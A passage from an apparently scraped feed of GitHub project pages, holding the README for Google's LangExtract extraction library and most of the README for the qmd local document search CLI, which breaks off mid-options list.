href=\"https://raw.githubusercontent.com/google/langextract/main/#installation\">Installation</a></li> \n <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#api-key-setup-for-cloud-models\">API Key Setup for Cloud Models</a></li> \n <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#adding-custom-model-providers\">Adding Custom Model Providers</a></li> \n <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#using-openai-models\">Using OpenAI Models</a></li> \n <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#using-local-llms-with-ollama\">Using Local LLMs with Ollama</a></li> \n <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#more-examples\">More Examples</a> \n  <ul> \n   <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#romeo-and-juliet-full-text-extraction\"><em>Romeo and Juliet</em> Full Text Extraction</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#medication-extraction\">Medication Extraction</a></li> \n   <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#radiology-report-structuring-radextract\">Radiology Report Structuring: RadExtract</a></li> \n  </ul> </li> \n <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#community-providers\">Community Providers</a></li> \n <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#contributing\">Contributing</a></li> \n <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#testing\">Testing</a></li> \n <li><a href=\"https://raw.githubusercontent.com/google/langextract/main/#disclaimer\">Disclaimer</a></li> \n</ul> \n<h2>Introduction</h2> \n<p>LangExtract is a Python library that uses LLMs to extract structured information from unstructured text documents based on user-defined instructions. It processes materials such as clinical notes or reports, identifying and organizing key details while ensuring the extracted data corresponds to the source text.</p> \n<h2>Why LangExtract?</h2> \n<ol> \n <li><strong>Precise Source Grounding:</strong> Maps every extraction to its exact location in the source text, enabling visual highlighting for easy traceability and verification.</li> \n <li><strong>Reliable Structured Outputs:</strong> Enforces a consistent output schema based on your few-shot examples, leveraging controlled generation in supported models like Gemini to guarantee robust, structured results.</li> \n <li><strong>Optimized for Long Documents:</strong> Overcomes the \"needle-in-a-haystack\" challenge of large document extraction by using an optimized strategy of text chunking, parallel processing, and multiple passes for higher recall.</li> \n <li><strong>Interactive Visualization:</strong> Instantly generates a self-contained, interactive HTML file to visualize and review thousands of extracted entities in their original context.</li> \n <li><strong>Flexible LLM Support:</strong> Supports your preferred models, from cloud-based LLMs like the Google Gemini family to local open-source models via the built-in Ollama interface.</li> \n <li><strong>Adaptable to Any Domain:</strong> Define extraction tasks for any domain using just a few examples. LangExtract adapts to your needs without requiring any model fine-tuning.</li> \n <li><strong>Leverages LLM World Knowledge:</strong> Utilize precise prompt wording and few-shot examples to influence how the extraction task may utilize LLM knowledge. The accuracy of any inferred information and its adherence to the task specification are contingent upon the selected LLM, the complexity of the task, the clarity of the prompt instructions, and the nature of the prompt examples.</li> \n</ol> \n<h2>Quick Start</h2> \n<blockquote> \n <p><strong>Note:</strong> Using cloud-hosted models like Gemini requires an API key. See the <a href=\"https://raw.githubusercontent.com/google/langextract/main/#api-key-setup-for-cloud-models\">API Key Setup</a> section for instructions on how to get and configure your key.</p> \n</blockquote> \n<p>Extract structured information with just a few lines of code.</p> \n<h3>1. Define Your Extraction Task</h3> \n<p>First, create a prompt that clearly describes what you want to extract. Then, provide a high-quality example to guide the model.</p> \n<pre><code class=\"language-python\">import langextract as lx\nimport textwrap\n\n# 1. Define the prompt and extraction rules\nprompt = textwrap.dedent(\"\"\"\\\n    Extract characters, emotions, and relationships in order of appearance.\n    Use exact text for extractions. Do not paraphrase or overlap entities.\n    Provide meaningful attributes for each entity to add context.\"\"\")\n\n# 2. Provide a high-quality example to guide the model\nexamples = [\n    lx.data.ExampleData(\n        text=\"ROMEO. But soft! What light through yonder window breaks? It is the east, and Juliet is the sun.\",\n        extractions=[\n            lx.data.Extraction(\n                extraction_class=\"character\",\n                extraction_text=\"ROMEO\",\n                attributes={\"emotional_state\": \"wonder\"}\n            ),\n            lx.data.Extraction(\n                extraction_class=\"emotion\",\n                extraction_text=\"But soft!\",\n                attributes={\"feeling\": \"gentle awe\"}\n            ),\n            lx.data.Extraction(\n                extraction_class=\"relationship\",\n                extraction_text=\"Juliet is the sun\",\n                attributes={\"type\": \"metaphor\"}\n            ),\n        ]\n    )\n]\n</code></pre> \n<blockquote> \n <p><strong>Note:</strong> Examples drive model behavior. Each <code>extraction_text</code> should ideally be verbatim from the example's <code>text</code> (no paraphrasing), listed in order of appearance. LangExtract raises <code>Prompt alignment</code> warnings by default if examples don't follow this pattern—resolve these for best results.</p> \n</blockquote> \n<h3>2. Run the Extraction</h3> \n<p>Provide your input text and the prompt materials to the <code>lx.extract</code> function.</p> \n<pre><code class=\"language-python\"># The input text to be processed\ninput_text = \"Lady Juliet gazed longingly at the stars, her heart aching for Romeo\"\n\n# Run the extraction\nresult = lx.extract(\n    text_or_documents=input_text,\n    prompt_description=prompt,\n    examples=examples,\n    model_id=\"gemini-2.5-flash\",\n)\n</code></pre> \n<blockquote> \n <p><strong>Model Selection</strong>: <code>gemini-2.5-flash</code> is the recommended default, offering an excellent balance of speed, cost, and quality. For highly complex tasks requiring deeper reasoning, <code>gemini-2.5-pro</code> may provide superior results. For large-scale or production use, a Tier 2 Gemini quota is suggested to increase throughput and avoid rate limits. See the <a href=\"https://ai.google.dev/gemini-api/docs/rate-limits#tier-2\">rate-limit documentation</a> for details.</p> \n <p><strong>Model Lifecycle</strong>: Note that Gemini models have a lifecycle with defined retirement dates. Users should consult the <a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/learn/model-versions\">official model version documentation</a> to stay informed about the latest stable and legacy versions.</p> \n</blockquote> \n<h3>3. Visualize the Results</h3> \n<p>The extractions can be saved to a <code>.jsonl</code> file, a popular format for working with language model data. LangExtract can then generate an interactive HTML visualization from this file to review the entities in context.</p> \n<pre><code class=\"language-python\"># Save the results to a JSONL file\nlx.io.save_annotated_documents([result], output_name=\"extraction_results.jsonl\", output_dir=\".\")\n\n# Generate the visualization from the file\nhtml_content = lx.visualize(\"extraction_results.jsonl\")\nwith open(\"visualization.html\", \"w\") as f:\n    if hasattr(html_content, 'data'):\n        f.write(html_content.data)  # For Jupyter/Colab\n    else:\n        f.write(html_content)\n</code></pre> \n<p>This creates an animated and interactive HTML file:</p> \n<p><img alt=\"Romeo and Juliet Basic Visualization \" src=\"https://raw.githubusercontent.com/google/langextract/main/docs/_static/romeo_juliet_basic.gif\" /></p> \n<blockquote> \n <p><strong>Note on LLM Knowledge Utilization:</strong> This example demonstrates extractions that stay close to the text evidence - extracting \"longing\" for Lady Juliet's emotional state and identifying \"yearning\" from \"gazed longingly at the stars.\" The task could be modified to generate attributes that draw more heavily from the LLM's world knowledge (e.g., adding <code>\"identity\": \"Capulet family daughter\"</code> or <code>\"literary_context\": \"tragic heroine\"</code>). The balance between text-evidence and knowledge-inference is controlled by your prompt instructions and example attributes.</p> \n</blockquote> \n<h3>Scaling to Longer Documents</h3> \n<p>For larger texts, you can process entire documents directly from URLs with parallel processing and enhanced sensitivity:</p> \n<pre><code class=\"language-python\"># Process Romeo &amp; Juliet directly from Project Gutenberg\nresult = lx.extract(\n    text_or_documents=\"https://www.gutenberg.org/files/1513/1513-0.txt\",\n    prompt_description=prompt,\n    examples=examples,\n    model_id=\"gemini-2.5-flash\",\n    extraction_passes=3,    # Improves recall through multiple passes\n    max_workers=20,         # Parallel processing for speed\n    max_char_buffer=1000    # Smaller contexts for better accuracy\n)\n</code></pre> \n<p>This approach can extract hundreds of entities from full novels while maintaining high accuracy. The interactive visualization seamlessly handles large result sets, making it easy to explore hundreds of entities from the output JSONL file. <strong><a href=\"https://github.com/google/langextract/raw/main/docs/examples/longer_text_example.md\">See the full <em>Romeo and Juliet</em> extraction example →</a></strong> for detailed results and performance insights.</p> \n<h3>Vertex AI Batch Processing</h3> \n<p>Save costs on large-scale tasks by enabling Vertex AI Batch API: <code>language_model_params={\"vertexai\": True, \"batch\": {\"enabled\": True}}</code>.</p> \n<p>See an example of the Vertex AI Batch API usage in <a href=\"https://raw.githubusercontent.com/google/langextract/main/docs/examples/batch_api_example.md\">this example</a>.</p> \n<h2>Installation</h2> \n<h3>From PyPI</h3> \n<pre><code class=\"language-bash\">pip install langextract\n</code></pre> \n<p><em>Recommended for most users. For isolated environments, consider using a virtual environment:</em></p> \n<pre><code class=\"language-bash\">python -m venv langextract_env\nsource langextract_env/bin/activate  # On Windows: langextract_env\\Scripts\\activate\npip install langextract\n</code></pre> \n<h3>From Source</h3> \n<p>LangExtract uses modern Python packaging with <code>pyproject.toml</code> for dependency management:</p> \n<p><em>Installing with <code>-e</code> puts the package in development mode, allowing you to modify the code without reinstalling.</em></p> \n<pre><code class=\"language-bash\">git clone https://github.com/google/langextract.git\ncd langextract\n\n# For basic installation:\npip install -e .\n\n# For development (includes linting tools):\npip install -e \".[dev]\"\n\n# For testing (includes pytest):\npip install -e \".[test]\"\n</code></pre> \n<h3>Docker</h3> \n<pre><code class=\"language-bash\">docker build -t langextract .\ndocker run --rm -e LANGEXTRACT_API_KEY=\"your-api-key\" langextract python your_script.py\n</code></pre> \n<h2>API Key Setup for Cloud Models</h2> \n<p>When using LangExtract with cloud-hosted models (like Gemini or OpenAI), you'll need to set up an API key. On-device models don't require an API key. For developers using local LLMs, LangExtract offers built-in support for Ollama and can be extended to other third-party APIs by updating the inference endpoints.</p> \n<h3>API Key Sources</h3> \n<p>Get API keys from:</p> \n<ul> \n <li><a href=\"https://aistudio.google.com/app/apikey\">AI Studio</a> for Gemini models</li> \n <li><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/sdks/overview\">Vertex AI</a> for enterprise use</li> \n <li><a href=\"https://platform.openai.com/api-keys\">OpenAI Platform</a> for OpenAI models</li> \n</ul> \n<h3>Setting up API key in your environment</h3> \n<p><strong>Option 1: Environment Variable</strong></p> \n<pre><code class=\"language-bash\">export LANGEXTRACT_API_KEY=\"your-api-key-here\"\n</code></pre> \n<p><strong>Option 2: .env File (Recommended)</strong></p> \n<p>Add your API key to a <code>.env</code> file:</p> \n<pre><code class=\"language-bash\"># Add API key to .env file\ncat &gt;&gt; .env &lt;&lt; 'EOF'\nLANGEXTRACT_API_KEY=your-api-key-here\nEOF\n\n# Keep your API key secure\necho '.env' &gt;&gt; .gitignore\n</code></pre> \n<p>In your Python code:</p> \n<pre><code class=\"language-python\">import langextract as lx\n\nresult = lx.extract(\n    text_or_documents=input_text,\n    prompt_description=\"Extract information...\",\n    examples=[...],\n    model_id=\"gemini-2.5-flash\"\n)\n</code></pre> \n<p><strong>Option 3: Direct API Key (Not Recommended for Production)</strong></p> \n<p>You can also provide the API key directly in your code, though this is not recommended for production use:</p> \n<pre><code class=\"language-python\">result = lx.extract(\n    text_or_documents=input_text,\n    prompt_description=\"Extract information...\",\n    examples=[...],\n    model_id=\"gemini-2.5-flash\",\n    api_key=\"your-api-key-here\"  # Only use this for testing/development\n)\n</code></pre> \n<p><strong>Option 4: Vertex AI (Service Accounts)</strong></p> \n<p>Use <a href=\"https://cloud.google.com/vertex-ai/docs/start/introduction-unified-platform\">Vertex AI</a> for authentication with service accounts:</p> \n<pre><code class=\"language-python\">result = lx.extract(\n    text_or_documents=input_text,\n    prompt_description=\"Extract information...\",\n    examples=[...],\n    model_id=\"gemini-2.5-flash\",\n    language_model_params={\n        \"vertexai\": True,\n        \"project\": \"your-project-id\",\n        \"location\": \"global\"  # or regional endpoint\n    }\n)\n</code></pre> \n<h2>Adding Custom Model Providers</h2> \n<p>LangExtract supports custom LLM providers via a lightweight plugin system. You can add support for new models without changing core code.</p> \n<ul> \n <li>Add new model support independently of the core library</li> \n <li>Distribute your provider as a separate Python package</li> \n <li>Keep custom dependencies isolated</li> \n <li>Override or extend built-in providers via priority-based resolution</li> \n</ul> \n<p>See the detailed guide in <a href=\"https://raw.githubusercontent.com/google/langextract/main/langextract/providers/README.md\">Provider System Documentation</a> to learn how to:</p> \n<ul> \n <li>Register a provider with <code>@registry.register(...)</code></li> \n <li>Publish an entry point for discovery</li> \n <li>Optionally provide a schema with <code>get_schema_class()</code> for structured output</li> \n <li>Integrate with the factory via <code>create_model(...)</code></li> \n</ul> \n<h2>Using OpenAI Models</h2> \n<p>LangExtract supports OpenAI models (requires optional dependency: <code>pip install langextract[openai]</code>):</p> \n<pre><code class=\"language-python\">import langextract as lx\n\nresult = lx.extract(\n    text_or_documents=input_text,\n    prompt_description=prompt,\n    examples=examples,\n    model_id=\"gpt-4o\",  # Automatically selects OpenAI provider\n    api_key=os.environ.get('OPENAI_API_KEY'),\n    fence_output=True,\n    use_schema_constraints=False\n)\n</code></pre> \n<p>Note: OpenAI models require <code>fence_output=True</code> and <code>use_schema_constraints=False</code> because LangExtract doesn't implement schema constraints for OpenAI yet.</p> \n<h2>Using Local LLMs with Ollama</h2> \n<p>LangExtract supports local inference using Ollama, allowing you to run models without API keys:</p> \n<pre><code class=\"language-python\">import langextract as lx\n\nresult = lx.extract(\n    text_or_documents=input_text,\n    prompt_description=prompt,\n    examples=examples,\n    model_id=\"gemma2:2b\",  # Automatically selects Ollama provider\n    model_url=\"http://localhost:11434\",\n    fence_output=False,\n    use_schema_constraints=False\n)\n</code></pre> \n<p><strong>Quick setup:</strong> Install Ollama from <a href=\"https://ollama.com/\">ollama.com</a>, run <code>ollama pull gemma2:2b</code>, then <code>ollama serve</code>.</p> \n<p>For detailed installation, Docker setup, and examples, see <a href=\"https://raw.githubusercontent.com/google/langextract/main/examples/ollama/\"><code>examples/ollama/</code></a>.</p> \n<h2>More Examples</h2> \n<p>Additional examples of LangExtract in action:</p> \n<h3><em>Romeo and Juliet</em> Full Text Extraction</h3> \n<p>LangExtract can process complete documents directly from URLs. This example demonstrates extraction from the full text of <em>Romeo and Juliet</em> from Project Gutenberg (147,843 characters), showing parallel processing, sequential extraction passes, and performance optimization for long document processing.</p> \n<p><strong><a href=\"https://github.com/google/langextract/raw/main/docs/examples/longer_text_example.md\">View <em>Romeo and Juliet</em> Full Text Example →</a></strong></p> \n<h3>Medication Extraction</h3> \n<blockquote> \n <p><strong>Disclaimer:</strong> This demonstration is for illustrative purposes of LangExtract's baseline capability only. It does not represent a finished or approved product, is not intended to diagnose or suggest treatment of any disease or condition, and should not be used for medical advice.</p> \n</blockquote> \n<p>LangExtract excels at extracting structured medical information from clinical text. These examples demonstrate both basic entity recognition (medication names, dosages, routes) and relationship extraction (connecting medications to their attributes), showing LangExtract's effectiveness for healthcare applications.</p> \n<p><strong><a href=\"https://github.com/google/langextract/raw/main/docs/examples/medication_examples.md\">View Medication Examples →</a></strong></p> \n<h3>Radiology Report Structuring: RadExtract</h3> \n<p>Explore RadExtract, a live interactive demo on HuggingFace Spaces that shows how LangExtract can automatically structure radiology reports. Try it directly in your browser with no setup required.</p> \n<p><strong><a href=\"https://huggingface.co/spaces/google/radextract\">View RadExtract Demo →</a></strong></p> \n<h2>Community Providers</h2> \n<p>Extend LangExtract with custom model providers! Check out our <a href=\"https://raw.githubusercontent.com/google/langextract/main/COMMUNITY_PROVIDERS.md\">Community Provider Plugins</a> registry to discover providers created by the community or add your own.</p> \n<p>For detailed instructions on creating a provider plugin, see the <a href=\"https://raw.githubusercontent.com/google/langextract/main/examples/custom_provider_plugin/\">Custom Provider Plugin Example</a>.</p> \n<h2>Contributing</h2> \n<p>Contributions are welcome! See <a href=\"https://github.com/google/langextract/raw/main/CONTRIBUTING.md\">CONTRIBUTING.md</a> to get started with development, testing, and pull requests. You must sign a <a href=\"https://cla.developers.google.com/about\">Contributor License Agreement</a> before submitting patches.</p> \n<h2>Testing</h2> \n<p>To run tests locally from the source:</p> \n<pre><code class=\"language-bash\"># Clone the repository\ngit clone https://github.com/google/langextract.git\ncd langextract\n\n# Install with test dependencies\npip install -e \".[test]\"\n\n# Run all tests\npytest tests\n</code></pre> \n<p>Or reproduce the full CI matrix locally with tox:</p> \n<pre><code class=\"language-bash\">tox  # runs pylint + pytest on Python 3.10 and 3.11\n</code></pre> \n<h3>Ollama Integration Testing</h3> \n<p>If you have Ollama installed locally, you can run integration tests:</p> \n<pre><code class=\"language-bash\"># Test Ollama integration (requires Ollama running with gemma2:2b model)\ntox -e ollama-integration\n</code></pre> \n<p>This test will automatically detect if Ollama is available and run real inference tests.</p> \n<h2>Development</h2> \n<h3>Code Formatting</h3> \n<p>This project uses automated formatting tools to maintain consistent code style:</p> \n<pre><code class=\"language-bash\"># Auto-format all code\n./autoformat.sh\n\n# Or run formatters separately\nisort langextract tests --profile google --line-length 80\npyink langextract tests --config pyproject.toml\n</code></pre> \n<h3>Pre-commit Hooks</h3> \n<p>For automatic formatting checks:</p> \n<pre><code class=\"language-bash\">pre-commit install  # One-time setup\npre-commit run --all-files  # Manual run\n</code></pre> \n<h3>Linting</h3> \n<p>Run linting before submitting PRs:</p> \n<pre><code class=\"language-bash\">pylint --rcfile=.pylintrc langextract tests\n</code></pre> \n<p>See <a href=\"https://raw.githubusercontent.com/google/langextract/main/CONTRIBUTING.md\">CONTRIBUTING.md</a> for full development guidelines.</p> \n<h2>Disclaimer</h2> \n<p>This is not an officially supported Google product. If you use LangExtract in production or publications, please cite accordingly and acknowledge usage. Use is subject to the <a href=\"https://github.com/google/langextract/raw/main/LICENSE\">Apache 2.0 License</a>. For health-related applications, use of LangExtract is also subject to the <a href=\"https://developers.google.com/health-ai-developer-foundations/terms\">Health AI Developer Foundations Terms of Use</a>.</p> \n<hr /> \n<p><strong>Happy Extracting!</strong></p>",
        "source": "mshibanami.github.io",
        "published": "",
        "fetched_at": "2026-02-09T23:33:02.259114Z",
        "tags": [
          {
            "name": "boundary_crossing",
            "score": 9
          },
          {
            "name": "value_redefinition",
            "score": 4
          },
          {
            "name": "scale_shift",
            "score": 9
          }
        ],
        "structural_score": 22,
        "timeliness_score": 1,
        "final_score": 7.3,
        "reddit_score": null,
        "reddit_comments": null
      },
      {
        "url": "https://github.com/tobi/qmd",
        "title": "tobi/qmd",
        "summary": "<p>mini cli search engine for your docs, knowledge bases, meeting notes, whatever. Tracking current sota approaches while being all local</p><hr /><h1>QMD - Query Markup Documents</h1> \n<p>An on-device search engine for everything you need to remember. Index your markdown notes, meeting transcripts, documentation, and knowledge bases. Search with keywords or natural language. Ideal for your agentic flows.</p> \n<p>QMD combines BM25 full-text search, vector semantic search, and LLM re-ranking—all running locally via node-llama-cpp with GGUF models.</p> \n<h2>Quick Start</h2> \n<pre><code class=\"language-sh\"># Install globally\nbun install -g https://github.com/tobi/qmd\n\n# Create collections for your notes, docs, and meeting transcripts\nqmd collection add ~/notes --name notes\nqmd collection add ~/Documents/meetings --name meetings\nqmd collection add ~/work/docs --name docs\n\n# Add context to help with search results\nqmd context add qmd://notes \"Personal notes and ideas\"\nqmd context add qmd://meetings \"Meeting transcripts and notes\"\nqmd context add qmd://docs \"Work documentation\"\n\n# Generate embeddings for semantic search\nqmd embed\n\n# Search across everything\nqmd search \"project timeline\"           # Fast keyword search\nqmd vsearch \"how to deploy\"             # Semantic search\nqmd query \"quarterly planning process\"  # Hybrid + reranking (best quality)\n\n# Get a specific document\nqmd get \"meetings/2024-01-15.md\"\n\n# Get a document by docid (shown in search results)\nqmd get \"#abc123\"\n\n# Get multiple documents by glob pattern\nqmd multi-get \"journals/2025-05*.md\"\n\n# Search within a specific collection\nqmd search \"API\" -c notes\n\n# Export all matches for an agent\nqmd search \"API\" --all --files --min-score 0.3\n</code></pre> \n<h3>Using with AI Agents</h3> \n<p>QMD's <code>--json</code> and <code>--files</code> output formats are designed for agentic workflows:</p> \n<pre><code class=\"language-sh\"># Get structured results for an LLM\nqmd search \"authentication\" --json -n 10\n\n# List all relevant files above a threshold\nqmd query \"error handling\" --all --files --min-score 0.4\n\n# Retrieve full document content\nqmd get \"docs/api-reference.md\" --full\n</code></pre> \n<h3>MCP Server</h3> \n<p>Although the tool works perfectly fine when you just tell your agent to use it on the command line, it also exposes an MCP (Model Context Protocol) server for tighter integration.</p> \n<p><strong>Tools exposed:</strong></p> \n<ul> \n <li><code>qmd_search</code> - Fast BM25 keyword search (supports collection filter)</li> \n <li><code>qmd_vsearch</code> - Semantic vector search (supports collection filter)</li> \n <li><code>qmd_query</code> - Hybrid search with reranking (supports collection filter)</li> \n <li><code>qmd_get</code> - Retrieve document by path or docid (with fuzzy matching suggestions)</li> \n <li><code>qmd_multi_get</code> - Retrieve multiple documents by glob pattern, list, or docids</li> \n <li><code>qmd_status</code> - Index health and collection info</li> \n</ul> \n<p><strong>Claude Desktop configuration</strong> (<code>~/Library/Application Support/Claude/claude_desktop_config.json</code>):</p> \n<pre><code class=\"language-json\">{\n  \"mcpServers\": {\n    \"qmd\": {\n      \"command\": \"qmd\",\n      \"args\": [\"mcp\"]\n    }\n  }\n}\n</code></pre> \n<p><strong>Claude Code</strong> — Install the plugin (recommended):</p> \n<pre><code class=\"language-bash\">claude marketplace add tobi/qmd\nclaude plugin add qmd@qmd\n</code></pre> \n<p>Or configure MCP manually in <code>~/.claude/settings.json</code>:</p> \n<pre><code class=\"language-json\">{\n  \"mcpServers\": {\n    \"qmd\": {\n      \"command\": \"qmd\",\n      \"args\": [\"mcp\"]\n    }\n  }\n}\n</code></pre> \n<h2>Architecture</h2> \n<pre><code>┌─────────────────────────────────────────────────────────────────────────────┐\n│                         QMD Hybrid Search Pipeline                          │\n└─────────────────────────────────────────────────────────────────────────────┘\n\n                              ┌─────────────────┐\n                              │   User Query    │\n                              └────────┬────────┘\n                                       │\n                        ┌──────────────┴──────────────┐\n                        ▼                             ▼\n               ┌────────────────┐            ┌────────────────┐\n               │ Query Expansion│            │  Original Query│\n               │  (fine-tuned)  │            │   (×2 weight)  │\n               └───────┬────────┘            └───────┬────────┘\n                       │                             │\n                       │ 2 alternative queries       │\n                       └──────────────┬──────────────┘\n                                      │\n              ┌───────────────────────┼───────────────────────┐\n              ▼                       ▼                       ▼\n     ┌─────────────────┐     ┌─────────────────┐     ┌─────────────────┐\n     │ Original Query  │     │ Expanded Query 1│     │ Expanded Query 2│\n     └────────┬────────┘     └────────┬────────┘     └────────┬────────┘\n              │                       │                       │\n      ┌───────┴───────┐       ┌───────┴───────┐       ┌───────┴───────┐\n      ▼               ▼       ▼               ▼       ▼               ▼\n  ┌───────┐       ┌───────┐ ┌───────┐     ┌───────┐ ┌───────┐     ┌───────┐\n  │ BM25  │       │Vector │ │ BM25  │     │Vector │ │ BM25  │     │Vector │\n  │(FTS5) │       │Search │ │(FTS5) │     │Search │ │(FTS5) │     │Search │\n  └───┬───┘       └───┬───┘ └───┬───┘     └───┬───┘ └───┬───┘     └───┬───┘\n      │               │         │             │         │             │\n      └───────┬───────┘         └──────┬──────┘         └──────┬──────┘\n              │                        │                       │\n              └────────────────────────┼───────────────────────┘\n                                       │\n                                       ▼\n                          ┌───────────────────────┐\n                          │   RRF Fusion + Bonus  │\n                          │  Original query: ×2   │\n                          │  Top-rank bonus: +0.05│\n                          │     Top 30 Kept       │\n                          └───────────┬───────────┘\n                                      │\n                                      ▼\n                          ┌───────────────────────┐\n                          │    LLM Re-ranking     │\n                          │  (qwen3-reranker)     │\n                          │  Yes/No + logprobs    │\n                          └───────────┬───────────┘\n                                      │\n                                      ▼\n                          ┌───────────────────────┐\n                          │  Position-Aware Blend │\n                          │  Top 1-3:  75% RRF    │\n                          │  Top 4-10: 60% RRF    │\n                          │  Top 11+:  40% RRF    │\n                          └───────────────────────┘\n</code></pre> \n<h2>Score Normalization &amp; Fusion</h2> \n<h3>Search Backends</h3> \n<table> \n <thead> \n  <tr> \n   <th>Backend</th> \n   <th>Raw Score</th> \n   <th>Conversion</th> \n   <th>Range</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td><strong>FTS (BM25)</strong></td> \n   <td>SQLite FTS5 BM25</td> \n   <td><code>Math.abs(score)</code></td> \n   <td>0 to ~25+</td> \n  </tr> \n  <tr> \n   <td><strong>Vector</strong></td> \n   <td>Cosine distance</td> \n   <td><code>1 / (1 + distance)</code></td> \n   <td>0.0 to 1.0</td> \n  </tr> \n  <tr> \n   <td><strong>Reranker</strong></td> \n   <td>LLM 0-10 rating</td> \n   <td><code>score / 10</code></td> \n   <td>0.0 to 1.0</td> \n  </tr> \n </tbody> \n</table> \n<h3>Fusion Strategy</h3> \n<p>The <code>query</code> command uses <strong>Reciprocal Rank Fusion (RRF)</strong> with position-aware blending:</p> \n<ol> \n <li><strong>Query Expansion</strong>: Original query (×2 for weighting) + 1 LLM variation</li> \n <li><strong>Parallel Retrieval</strong>: Each query searches both FTS and vector indexes</li> \n <li><strong>RRF Fusion</strong>: Combine all result lists using <code>score = Σ(1/(k+rank+1))</code> where k=60</li> \n <li><strong>Top-Rank Bonus</strong>: Documents ranking #1 in any list get +0.05, #2-3 get +0.02</li> \n <li><strong>Top-K Selection</strong>: Take top 30 candidates for reranking</li> \n <li><strong>Re-ranking</strong>: LLM scores each document (yes/no with logprobs confidence)</li> \n <li><strong>Position-Aware Blending</strong>: \n  <ul> \n   <li>RRF rank 1-3: 75% retrieval, 25% reranker (preserves exact matches)</li> \n   <li>RRF rank 4-10: 60% retrieval, 40% reranker</li> \n   <li>RRF rank 11+: 40% retrieval, 60% reranker (trust reranker more)</li> \n  </ul> </li> \n</ol> \n<p><strong>Why this approach</strong>: Pure RRF can dilute exact matches when expanded queries don't match. The top-rank bonus preserves documents that score #1 for the original query. Position-aware blending prevents the reranker from destroying high-confidence retrieval results.</p> \n<h3>Score Interpretation</h3> \n<table> \n <thead> \n  <tr> \n   <th>Score</th> \n   <th>Meaning</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td>0.8 - 1.0</td> \n   <td>Highly relevant</td> \n  </tr> \n  <tr> \n   <td>0.5 - 0.8</td> \n   <td>Moderately relevant</td> \n  </tr> \n  <tr> \n   <td>0.2 - 0.5</td> \n   <td>Somewhat relevant</td> \n  </tr> \n  <tr> \n   <td>0.0 - 0.2</td> \n   <td>Low relevance</td> \n  </tr> \n </tbody> \n</table> \n<h2>Requirements</h2> \n<h3>System Requirements</h3> \n<ul> \n <li><strong>Bun</strong> &gt;= 1.0.0</li> \n <li><strong>macOS</strong>: Homebrew SQLite (for extension support) <pre><code class=\"language-sh\">brew install sqlite\n</code></pre> </li> \n</ul> \n<h3>GGUF Models (via node-llama-cpp)</h3> \n<p>QMD uses three local GGUF models (auto-downloaded on first use):</p> \n<table> \n <thead> \n  <tr> \n   <th>Model</th> \n   <th>Purpose</th> \n   <th>Size</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td><code>embeddinggemma-300M-Q8_0</code></td> \n   <td>Vector embeddings</td> \n   <td>~300MB</td> \n  </tr> \n  <tr> \n   <td><code>qwen3-reranker-0.6b-q8_0</code></td> \n   <td>Re-ranking</td> \n   <td>~640MB</td> \n  </tr> \n  <tr> \n   <td><code>qmd-query-expansion-1.7B-q4_k_m</code></td> \n   <td>Query expansion (fine-tuned)</td> \n   <td>~1.1GB</td> \n  </tr> \n </tbody> \n</table> \n<p>Models are downloaded from HuggingFace and cached in <code>~/.cache/qmd/models/</code>.</p> \n<h2>Installation</h2> \n<pre><code class=\"language-sh\">bun install -g github:tobi/qmd\n</code></pre> \n<p>Make sure <code>~/.bun/bin</code> is in your PATH.</p> \n<h3>Development</h3> \n<pre><code class=\"language-sh\">git clone https://github.com/tobi/qmd\ncd qmd\nbun install\nbun link\n</code></pre> \n<h2>Usage</h2> \n<h3>Collection Management</h3> \n<pre><code class=\"language-sh\"># Create a collection from current directory\nqmd collection add . --name myproject\n\n# Create a collection with explicit path and custom glob mask\nqmd collection add ~/Documents/notes --name notes --mask \"**/*.md\"\n\n# List all collections\nqmd collection list\n\n# Remove a collection\nqmd collection remove myproject\n\n# Rename a collection\nqmd collection rename myproject my-project\n\n# List files in a collection\nqmd ls notes\nqmd ls notes/subfolder\n</code></pre> \n<h3>Generate Vector Embeddings</h3> \n<pre><code class=\"language-sh\"># Embed all indexed documents (800 tokens/chunk, 15% overlap)\nqmd embed\n\n# Force re-embed everything\nqmd embed -f\n</code></pre> \n<h3>Context Management</h3> \n<p>Context adds descriptive metadata to collections and paths, helping search understand your content.</p> \n<pre><code class=\"language-sh\"># Add context to a collection (using qmd:// virtual paths)\nqmd context add qmd://notes \"Personal notes and ideas\"\nqmd context add qmd://docs/api \"API documentation\"\n\n# Add context from within a collection directory\ncd ~/notes &amp;&amp; qmd context add \"Personal notes and ideas\"\ncd ~/notes/work &amp;&amp; qmd context add \"Work-related notes\"\n\n# Add global context (applies to all collections)\nqmd context add / \"Knowledge base for my projects\"\n\n# List all contexts\nqmd context list\n\n# Remove context\nqmd context rm qmd://notes/old\n</code></pre> \n<h3>Search Commands</h3> \n<pre><code>┌──────────────────────────────────────────────────────────────────┐\n│                        Search Modes                              │\n├──────────┬───────────────────────────────────────────────────────┤\n│ search   │ BM25 full-text search only                           │\n│ vsearch  │ Vector semantic search only                          │\n│ query    │ Hybrid: FTS + Vector + Query Expansion + Re-ranking  │\n└──────────┴───────────────────────────────────────────────────────┘\n</code></pre> \n<pre><code class=\"language-sh\"># Full-text search (fast, keyword-based)\nqmd search \"authentication flow\"\n\n# Vector search (semantic similarity)\nqmd vsearch \"how to login\"\n\n# Hybrid search with re-ranking (best quality)\nqmd query \"user authentication\"\n</code></pre> \n<h3>Options</h3> \n<pre><code class=\"language-sh\"># Search options\n-n &lt;num&gt;           # Number of results (default: 5, or 20 for --files/--json)\n-c, --collection   # Restrict search to a specific collection\n--all              # Return all matches (use with --min-score to filter)\n--min-score &lt;num&gt;  # Minimum score threshold (default: 0)\n--full             # Show full document content\n--line-numbers     # Add line numbers to output\n--index &lt;name&gt;     # Use named index\n\n# 